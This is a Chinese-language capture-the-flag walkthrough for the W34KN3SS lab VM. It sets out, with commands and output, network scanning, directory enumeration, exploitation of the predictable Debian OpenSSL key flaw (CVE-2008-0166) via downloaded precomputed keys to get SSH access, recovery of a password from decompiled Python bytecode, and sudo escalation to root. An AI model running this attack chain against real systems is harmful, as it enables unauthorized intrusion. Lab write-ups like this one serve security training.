VMware双击打开，nat模式运行即可！

--------------------------------------------
--------------------------------------------
1、nmap 192.168.253.0/24 -sP

Nmap scan report for localhost (192.168.253.129)
Host is up (0.0018s latency).


--------------------------------------------
--------------------------------------------
2、nmap 192.168.253.129 -p- -A


22/tcp  open  ssh      OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
80/tcp  open  http     Apache httpd 2.4.29 ((Ubuntu))
443/tcp open  ssl/http Apache httpd 2.4.29 ((Ubuntu))


--------------------------------------------
--------------------------------------------
3、web信息收集

dirb 来枚举 Web 服务器上的目录：
dirb http://192.168.253.129

http://192.168.253.129/test/
http://192.168.253.129/uploads/



访问：
http://192.168.253.129/test/

发现存在很多key现象！
在访问https页面的证书内发现新的域名：weakness.jth
添加到hosts中！

浏览器上浏览weakness.jth，结果给出了一个有用的用户信息：n30


--------------------------------------------
--------------------------------------------
4、域名信息枚举

dirb http://weakness.jth
发现：
http://weakness.jth/private/
发现两个文件：

1）mykey.pub
2）notes.txt信息提示：
this key was generated by openssl 0.9.8c-1
发现的公钥是由它生成的！

第一个文件（mykey.pub）是一个公钥，但我们需要找到私钥才能使用它来使用 SSH 服务登录服务器。所以，我检查了第二个文件。它包含一个提示。提示告诉我使用 openssl 版本 0.9.8c-1 生成的密钥。

可预测 PRNG 漏洞（CVE-2008-0166）有关，基于 Debian 的操作系统上的 OpenSSL 0.9.8c-1 到 0.9.8g-9 之前的版本使用随机数生成器生成可预测的数字，这使得远程攻击者更容易对加密密钥进行暴力猜测攻击


--------------------------------------------
--------------------------------------------
5、OpenSSL漏洞利用

搜索：
searchsploit 0.9.8c-1
发现：linux/remote/5622.txt

searchsploit -m 5622

proxychains wget https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/5622.tar.bz2

tar xjvf 5622.tar.bz2


cat mykey.pub
grep -r -l "ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEApC39uhie9gZahjiiMo+k8DOqKLujcZMN1bESzSLT8H5jRGj8n1FFqjJw27Nu5JYTI73Szhg/uoeMOfECHNzGj7GtoMqwh38clgVjQ7Qzb47/kguAeWMUcUHrCBz9KsN+7eNTb5cfu0O0QgY+DoLxuwfVufRVNcvaNyo0VS1dAJWgDnskJJRD+46RlkUyVNhwegA0QRj9Salmpssp+z5wq7KBPL1S982QwkdhyvKg3dMy29j/C5sIIqM/mlqilhuidwo1ozjQlU2+yAVo5XrWDo0qVzzxsnTxB5JAfF7ifoDZp2yczZg+ZavtmfItQt1Vac1vSuBPCpTqkjE/4Iklgw== root@targetcluster"
mykey.pub
rsa/2048/4161de56829de2fe64b9055711f531c1-2537.pub

使用私钥使用 SSH 服务登录到我的目标：
cd /rsa/2048
ssh -i 4161de56829de2fe64b9055711f531c1-2537 n30@192.168.253.129

--------------------------------------------
--------------------------------------------
6、内部信息枚举

ls -la 发现：
.sudo_as_admin_successful
意味着该用户可以使用 root 权限执行 sudo，但是需要密码登录，不知道密码！


file code
code: python 2.7 byte-compiled
python 2.7 字节编译的文件！

下载：
https://github.com/rocky/python-uncompyle6
pip install uncompyle6

或者：
pip install decompyle3


mv code code.pyc
dMASDNB!!#B!#!#33


--------------------------------------------
--------------------------------------------
6、提权

n30@W34KN3SS:~$ sudo -l
[sudo] password for n30: 
Matching Defaults entries for n30 on W34KN3SS:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User n30 may run the following commands on W34KN3SS:
    (ALL : ALL) ALL

sudo su
root@W34KN3SS:/home/n30# id
uid=0(root) gid=0(root) groups=0(root)












































